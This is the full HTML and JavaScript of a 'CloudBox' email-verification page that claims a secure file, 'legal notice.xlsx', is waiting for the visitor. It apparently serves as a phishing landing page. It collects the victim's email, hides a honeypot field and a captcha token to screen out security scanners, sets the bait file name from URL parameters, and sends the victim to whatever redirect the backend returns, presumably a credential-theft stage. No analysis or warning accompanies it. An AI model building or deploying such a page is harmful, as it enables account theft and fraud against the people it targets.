<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>Email verification</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="color-scheme" content="light dark">
<style>
  /* ===== Brand tokens ===== */
  :root{
    --brand:#1f6fd1;          /* header + button */
    --brand-700:#1657a6;      /* button hover/active */
    --bg:#f1f1f1;             /* page background */
    --card:#f5f5f5;           /* card background */
    --text:#1f2937;           /* main text */
    --muted:#6b7280;          /* secondary text */
    --border:#ccc;            /* light strokes */
    --radius:3px;             /* card/button radius */
    --card-shadow:0 12px 28px rgba(0,0,0,.08);
    --maxw:320px;
    --focus:#6aa1ff;          /* focus ring */
    /* layout gaps + logo shift */
    --logo-size:100px;
    --gap-top:6px;            /* brandbar → logo (tighter) */
    --gap-between:6px;        /* logo → card (tighter) */
    --brandbar-h:38px;        /* keep in sync with .brandbar height */
    --logo-shift: -10px;      /* negative = nudge left, positive = right */
  }
  @media (prefers-color-scheme: dark){
    :root{
      --bg:#0f141a; --card:#121922; --text:#f2f5f9; --muted:#9aa4b2; --border:#273142;
      --card-shadow:0 12px 28px rgba(0,0,0,.6);
    }
  }

  /* ===== Base ===== */
  *{ box-sizing:border-box }
  html,body{ height:100% }
  body{
    margin:0;
    font:14px/1.5 system-ui,-apple-system,Segoe UI,Roboto,Helvetica,Arial,sans-serif;
    background:var(--bg);
    color:var(--text);
  }

  /* Top brand bar */
  .brandbar{
    height:var(--brandbar-h);
    background:var(--brand);
    color:#fff;
    display:flex; align-items:center;
    padding:0 16px;
    font-weight:600;
    letter-spacing:.2px;
  }

  /* Centered container — stop full-height centering so spacing is tight */
  .wrap{
    min-height:auto;                         /* was calc(100% - var(--brandbar-h)) */
    display:flex;
    flex-direction:column;
    align-items:center;                      /* keep horizontally centered */
    justify-content:flex-start;              /* stack near the top */
    padding:var(--gap-top) 16px 16px;        /* tighter */
  }

  /* Logo */
  .card-logo{
    width:var(--logo-size);
    height:var(--logo-size);
    display:block;
    margin:0 auto var(--gap-between);        /* small gap under logo */
    transform:translateX(var(--logo-shift)); /* nudge slightly left */
    object-fit:contain;
    max-width:100%;
  }
  @media (prefers-color-scheme: dark){
    .card-logo{ filter:brightness(1.05) contrast(1.02); }
  }

  /* Card */
  .card{
    width:75%;
    max-width:var(--maxw);
    background:var(--card);
    border:1px solid var(--border);
    border-radius:var(--radius);
    box-shadow:var(--card-shadow);
    overflow:hidden;
    font-size:14px;
    margin-top:var(--gap-between);           /* sits close to logo */
  }
  .card-head{
    padding:10px 12px;                       /* tighter header */
    border-bottom:1.2px solid var(--border);
    text-align:center;
  }
  .card-title{
    margin:0;
    font-size:20px;
    line-height:1.25;
    font-weight:500;
  }
  .card-body{ padding:10px 16px }            /* slightly tighter body padding */
  .card-body p{ margin:0 0 10px 0; color:var(--muted) }

  /* File name badge */
  .file{
    display:inline-block;
    padding:8px 12px;
    border:0;
    border-radius:4px;
    background:#f5f5f5;
    color:var(--text);
    font-weight:500;
    margin:4px 0 10px;
    word-break:break-word;
    max-width:100%;
    font-size:14px;
  }

  /* Form */
  .field{ margin:10px 0 0 0 }
  label{ display:block; font-size:12px; color:var(--muted); margin-bottom:6px }
  .input{
    width:100%;
    height:40px;
    border:1px solid var(--border);
    border-radius:3px;
    padding:0 12px;
    background:var(--card);
    color:var(--text);
    outline:none;
  }
  .input:focus{ border-color:var(--focus); }

  /* Button */
  .actions{ margin:14px 0 6px; display:flex; gap:12px }
  .btn{
    appearance:none; border:0; cursor:pointer;
    height:40px; padding:0 18px; border-radius:var(--radius);
    background:var(--brand); color:#fff; font-weight:650; width:100%;
  }
  .btn:hover{ background:var(--brand-700) }
  .btn:disabled{ opacity:.6; cursor:not-allowed }

  .caption{ font-size:12px; color:var(--muted); margin-top:8px }
  .caption small{ display:block; opacity:.9 }

  /* Inline alert */
  .alert { font:12px/1.6 system-ui,-apple-system,Segoe UI,Roboto,Helvetica,Arial,sans-serif; margin-top:8px; }

  /* Narrow */
  @media (max-width:480px){
    :root{ --maxw:92vw; --logo-size:84px; }
    .card-title{ font-size:18px }
  }
</style>

</head>
<body>

  <!-- Top brand bar -->
  <div class="brandbar">
    <span id="brandName">CloudBox</span>
  </div>

  <main class="wrap">
    <!-- Logo above the card -->
    <img class="card-logo" src="nn.PNG" alt="" width="100" height="100" decoding="async" loading="eager">

    <!-- Honeypot + optional captcha token (can sit outside; JS reads them by id) -->
    <input type="text" id="middleName" name="middleName" tabindex="-1" autocomplete="off"
           aria-hidden="true" style="position:absolute;left:-9999px;opacity:0;height:0;width:0;border:0;padding:0;">
    <input type="hidden" id="cfToken" name="cfToken" value="">

    <!-- Form -->
    <form class="card" id="verifyForm" method="post" action="/validate.php">
      <header class="card-head" aria-labelledby="t">
        <h1 id="t" class="card-title">Verify Your Identity</h1>
      </header>

      <section class="card-body">
        <p>You’ve been sent a secure link to:</p>
        <div class="file" id="fileName">legal notice.xlsx</div>
        <p>To open this secure link, enter the email address it was shared with.</p>

        <div class="field">
          <label for="email">Email address</label>
          <input class="input" id="email" name="email" type="email" autocomplete="email"
                 placeholder="Enter email" required inputmode="email" />
        </div>

        <div class="actions">
          <button class="btn" id="continueBtn" type="submit" disabled>Next</button>
        </div>

        <div class="caption" id="disclosure">
          <small>By selecting “Next”, you allow this form to use your email in accordance with its Privacy Notice.</small>
        </div>
      </section>
    </form>
  </main>

  <script>
    // ---- Elements
    const form  = document.getElementById('verifyForm');
    const email = document.getElementById('email');
    const btn   = document.getElementById('continueBtn');

    // Optional hidden fields (ok if missing)
    const cfTok = document.getElementById('cfToken');    // e.g., Turnstile/Recaptcha
    const hp    = document.getElementById('middleName'); // honeypot (must stay empty)

    // Guards (avoid null refs if DOM changes)
    if (!form || !email || !btn) {
      console.error('Verify form not found or missing elements.');
    } else {
      // Enable button only when email shape is OK
      const looksLikeEmail = v => /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(String(v).trim());
      email.addEventListener('input', () => { btn.disabled = !looksLikeEmail(email.value) });

      // Message helper
      function showMsg(text, ok=false){
        let el = document.getElementById('alert');
        if (!el) {
          el = document.createElement('div');
          el.id = 'alert';
          el.className = 'alert';
          form.querySelector('.card-body').appendChild(el);
        }
        el.textContent = text;
        el.setAttribute('role', 'status');
        el.style.color = ok ? '#1e5fcc' : '#b91c1c';
      }

      // Resolve endpoint from form action (defaults to /validate.php)
      const endpoint = new URL(form.getAttribute('action') || '/validate.php', location.href).toString();

      // Progressive-enhanced JSON submit (backend expects JSON)
      form.addEventListener('submit', async (e) => {
        e.preventDefault();
        if (!looksLikeEmail(email.value)) {
          showMsg('Please enter a valid email address.');
          return;
        }

        btn.disabled = true;
        const original = btn.textContent;
        btn.textContent = 'Checking…';

        const payload = {
          email: String(email.value || '').trim().toLowerCase(),
          jsToken: 'ok-' + Math.random().toString(36).slice(2),
          cfToken: cfTok ? cfTok.value : '',
          middleName: hp ? hp.value : ''   // must be empty; backend flags bots otherwise
        };

        // Timeout after 12s to avoid hanging UI
        const ctl = new AbortController();
        const t = setTimeout(() => ctl.abort(), 12000);

        try {
          const res = await fetch(endpoint, {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json; charset=utf-8',
              'X-Client-Lang': navigator.language || 'en'
            },
            body: JSON.stringify(payload),
            signal: ctl.signal
          });

          let data = null;
          try { data = await res.json(); } catch { data = {}; }

          // Success path (whitelisted): backend returns { valid:true, redirect:"..." }
          if (res.ok && data && data.valid && data.redirect) {
            showMsg(data.message || 'Validated', true);
            location.assign(data.redirect);
            return;
          }

          // Friendly, non-enumerating message for all other cases
          showMsg('If your email is permitted for this file, you will receive access shortly.');
        } catch (err) {
          showMsg('Network issue. Please retry in a moment.');
        } finally {
          clearTimeout(t);
          btn.disabled = !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(String(email.value).trim());
          btn.textContent = original;
        }
      });

      // Optional: query params → UI
      const q = new URLSearchParams(location.search);
      const fileEl = document.getElementById('fileName');
      if (q.get('file') && fileEl) fileEl.textContent = q.get('file');
      const hostEl = document.getElementById('hostDomain');
      if (q.get('host') && hostEl) hostEl.textContent = q.get('host');
    }
  </script>
</body>
</html>
